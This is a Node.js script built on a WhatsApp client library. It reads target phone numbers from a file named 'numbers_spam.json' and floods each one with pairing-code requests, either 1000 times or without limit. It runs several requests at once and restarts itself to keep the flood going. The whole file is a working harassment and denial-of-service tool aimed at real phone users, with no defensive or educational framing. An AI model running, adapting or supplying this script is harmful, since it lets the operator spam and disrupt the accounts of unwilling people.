const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const { spawn } = require('child_process');
const pLimit = require('p-limit');

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

let lastModifiedTime = 0;

const checkFileChange = (filePath) => {
    const stats = fs.statSync(filePath);
    const modifiedTime = stats.mtimeMs;
    if (modifiedTime !== lastModifiedTime) {
        lastModifiedTime = modifiedTime;
        return true;
    }
    return false;
};

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    let phoneNumbers = [];
    const loadNumbers = () => {
        const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
        phoneNumbers = Object.values(phoneNumbersData).flat();
    };

    loadNumbers();

    const option = await Promise.race([
        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
        new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
    ]);

    let count = 0;
    const limit = pLimit(5); // تعيين حد لعدد الطلبات المتزامنة

    const intervalId = setInterval(() => {
        loadNumbers();
        if (checkFileChange('numbers_spam.json')) {
            console.log("File changed, restarting...");
            spawn(process.execPath, [__filename], { stdio: 'inherit' });
            process.exit();
        }
    }, 1000);

    setInterval(() => {
        console.log("Pausing for 10 minutes...");
        clearInterval(intervalId);

        setTimeout(() => {
            console.log("Restarting the process...");
            spawn(process.execPath, [__filename], { stdio: 'inherit' });
            process.exit();
        }, 10000);
    }, 10 * 60 * 1000);

    try {
        if (option === '1') {
            const xeonCodes = 1000;
            for (let i = 0; i < xeonCodes; i++) {
                const promises = phoneNumbers.map(phoneNumber => 
                    limit(() => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes))
                );
                await Promise.all(promises);
            }
        } else {
            while (true) {
                const promises = phoneNumbers.map(phoneNumber => 
                    limit(() => sendPairingCode(XeonBotInc, phoneNumber, ++count))
                );
                await Promise.all(promises);
            }
        }
    } catch (error) {
        console.error('Error:', error);
    }

    return XeonBotInc;
}

async function sendPairingCode(XeonBotInc, phoneNumber, index, total) {
    try {
        let code = await XeonBotInc.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`${phoneNumber} [${index}/${total || 'Unlimited'}]: ${code}`);
    } catch (error) {
        console.error('Error:', error.message);
    }
}

XeonProject();
